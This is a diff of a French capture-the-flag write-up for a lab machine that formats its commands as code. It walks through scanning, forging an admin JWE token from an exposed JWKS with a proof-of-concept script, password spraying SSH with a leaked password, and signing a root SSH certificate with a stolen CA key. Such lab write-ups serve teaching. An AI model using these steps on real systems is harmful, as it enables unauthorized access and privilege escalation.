@@ -4,7 +4,7 @@
 ### IP: 10.129.244.220
 
 Reconnaissance
-nmap -sC -sV 10.129.244.220
+```nmap -sC -sV 10.129.244.220```
 Ports ouverts :
 
 22/tcp — SSH
@@ -30,18 +30,18 @@ Rôles disponibles : ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 Foothold — JWT Forgery (JWE)
 Le JWKS est accessible sans authentification :
 
-curl http://10.129.244.220:8080/api/auth/jwks
+```curl http://10.129.244.220:8080/api/auth/jwks```
 
 On à l'url il n'y a plus qu'a la passer au PoC 
 
-python3 poc.py --jwks http://10.129.244.220:8080/api/auth/jwks 
+```python3 poc.py --jwks http://10.129.244.220:8080/api/auth/jwks``` 
 
 on récupère notre jwt malveillant.
 
 Token forgé injecté via la console du navigateur :
 
-sessionStorage.setItem('auth_token', '<JWE_TOKEN>');
-window.location.href = '/dashboard';
+```sessionStorage.setItem('auth_token', '<JWE_TOKEN>');```
+```window.location.href = '/dashboard';```
 Accès admin obtenu.
 
 Shell Initial — svc-deploy
@@ -52,8 +52,8 @@ security contenant un password : D3pl0y_$$H_Now42!
 et un autre onglet users, nous tentons un password spraying avec les différents users
 bingo svc-deploy fonctionne :
 
-ssh svc-deploy@10.129.244.220
-User flag : cat /home/svc-deploy/user.txt
+```ssh svc-deploy@10.129.244.220```
+User flag : ```cat /home/svc-deploy/user.txt```
 
 premier flag obtenu !
 
@@ -74,17 +74,17 @@ PermitRootLogin prohibit-password autorise root par certificat (pas par mot de p
 
 Exploitation
 # Récupérer la clé CA
-cat /opt/principal/ssh/ca > /tmp/ca && chmod 600 /tmp/ca
+```cat /opt/principal/ssh/ca > /tmp/ca && chmod 600 /tmp/ca```
 
 # Générer une paire de clés
-ssh-keygen -f /tmp/id_root -N ""
+```ssh-keygen -f /tmp/id_root -N ""```
 
 # Signer un certificat pour root valable 1h
-ssh-keygen -s /tmp/ca -I root_cert -n root -V +1h /tmp/id_root.pub
+```ssh-keygen -s /tmp/ca -I root_cert -n root -V +1h /tmp/id_root.pub```
 
 # Connexion root par certificat
-ssh -i /tmp/id_root -o CertificateFile=/tmp/id_root-cert.pub root@10.129.244.220
-Root flag : cat /root/root.txt
+```ssh -i /tmp/id_root -o CertificateFile=/tmp/id_root-cert.pub root@10.129.244.220```
+Root flag : ```cat /root/root.txt```
 
 # Lessons Learned
 Les endpoints JS côté client exposent souvent l'architecture interne de l'API
